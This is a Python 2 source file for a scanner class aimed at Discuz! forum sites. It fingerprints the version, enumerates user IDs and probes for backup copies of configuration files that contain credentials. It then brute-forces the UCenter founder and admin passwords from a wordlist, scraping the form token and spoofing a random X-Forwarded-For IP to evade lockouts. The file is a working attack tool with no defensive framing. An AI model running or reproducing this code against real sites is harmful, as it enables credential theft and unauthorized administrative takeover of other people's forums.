# -*- coding: utf-8 -*-
import scan
import urllib
import re
import random

import re
import colprint

class DiscuzScan(object):

    Scanner=scan.scanclass()
    def DzScan(self,target):
        self.GetVersion(target)
        self.GetBak(target)
        self.PwdList(target)
    def GetVersion(self,target):

        result=self.Scanner.GetData(target+'robots.txt',regstr='*')
        VERSION=re.findall('(X2)|(X2.5)|(X3.1)|(X3.2)|(X3)|(7.0.0)|(7.2)|(6.0.0)',result[2])
        if VERSION:
            for x in VERSION[0]:
                if x:
                    colprint.strprint(10,'VERSION is '+x)
        else:
            print 'VERSION not found'
    def GetBak(self,target):
         
        for i in range(1,11):
            url=target+'?'+str(i)
            result=self.Scanner.GetData(url,regstr='uid='+str(i)+'">(\S+)</a>')     
            print result
        BAKLIST=['%23','.bak','_bak','.swp','.orig','.txt','.old','%7e','.inc','_inc']
        for BakExt in BAKLIST:
            result=self.Scanner.GetData(target+'config/config_ucenter.php'+BakExt,regstr='<\?php')
            print result[1],target+'config/config_ucenter.php'+BakExt
            if result[1]==200:
                colprint.strprint(10,'Something is Found')
            result=self.Scanner.GetData(target+'config/config_global.php'+BakExt,regstr='<\?php')
            print result[1],target+'config/config_global.php'+BakExt
            if result[1]==200:
                colprint.strprint(10,'Something is Found')
            result=self.Scanner.GetData(target+'data/config.inc.php'+BakExt,regstr='<\?php')
            print result[1],target+'data/config.inc.php'+BakExt
            if result[1]==200:
                colprint.strprint(10,'Something is Found')
    def GetFounderPwd(self,target,password):
        
        Hashlist=self.GetHash(target)  
        ip=self.Ipaddress()
        formhash=''.join(Hashlist[0])
        seccodehidden=''.join(Hashlist[1])
        paradata={'sid':'','formhash':formhash,'seccodehidden':seccodehidden,'iframe':'0','isfounder':'1','password':password,'seccode':'CCCC','submit':'%B5%C7+%C2%BC'}    
        returnsize=self.Scanner.GetData(target+'uc_server/admin.php?m=user&a=login',postdata=paradata,header={'X-Forwarded-For':ip},regstr='*')
        return returnsize
    def GetPwd(self,target,password,username='admin'):
        
        Hashlist=self.GetHash(target)
        ip=self.Ipaddress()
        formhash=''.join(Hashlist[0])
        seccodehidden=''.join(Hashlist[1])
        paradata={'sid':'','formhash':formhash,'seccodehidden':seccodehidden,'iframe':'0','isfounder':'0','username':username,'password':password,'seccode':'CCCC','submit':'%B5%C7+%C2%BC'}    
        returnsize=self.Scanner.GetData(target+'uc_server/admin.php?m=user&a=login',postdata=paradata,header={'X-Forwarded-For':ip},regstr='*')
        return returnsize
    def GetHash(self,target):
        
        paradata={'m':'user','a':'login','iframe':'','sid':''}
        paradata=urllib.urlencode(paradata)
        result=self.Scanner.GetData(target+'/uc_server/admin.php?'+paradata,regstr='*')
        Hashcode=[]
        Hashcode.append(re.findall('formhash" value="([a-zA-Z0-9]{16})"',result[2]))
        Hashcode.append(re.findall('hidden" value="(\S+)"',result[2]))
        return Hashcode
    def Ipaddress(self):

        ipaddress=[]
        for x in xrange(1,5):
            ipaddress.append(str(random.randint(1,254)))
        return '.'.join(ipaddress)
    def PwdList(self,target):

        result=self.Scanner.GetData(target+'uc_server/admin.php?m=user&a=login')
        if result[1]!=200:
            colprint.strprint(12,'UC_SERVER is not usable!')
            return None
        else:
            colprint.strprint(10,'UC_SERVER is usable.')
        result=self.Scanner.GetData(target+'develop.php')
        if result[1]==200:
            colprint.strprint(10,'develop is usable!')
        result=self.Scanner.GetData(target+'utility')
        if result[1]==200:
            colprint.strprint(10,'utility path is found.')

        with open('password.txt','r') as pwdlist:
            for line in  pwdlist:
                password=line.strip()
                result=self.GetFounderPwd(target,password)
                print 'UC_SERVER Founder ',password
                if re.findall('(sid=)',result[0]):
                    colprint.strprint(10,'Passwd is Found '+password)
                result=self.GetPwd(target,password)
                print 'admin ',password
                if re.findall('(sid=)',result[0]):
                    colprint.strprint(10,'Passwd is Found '+password)          
    def CodeRec(self,url):
        print ''#TBD
        

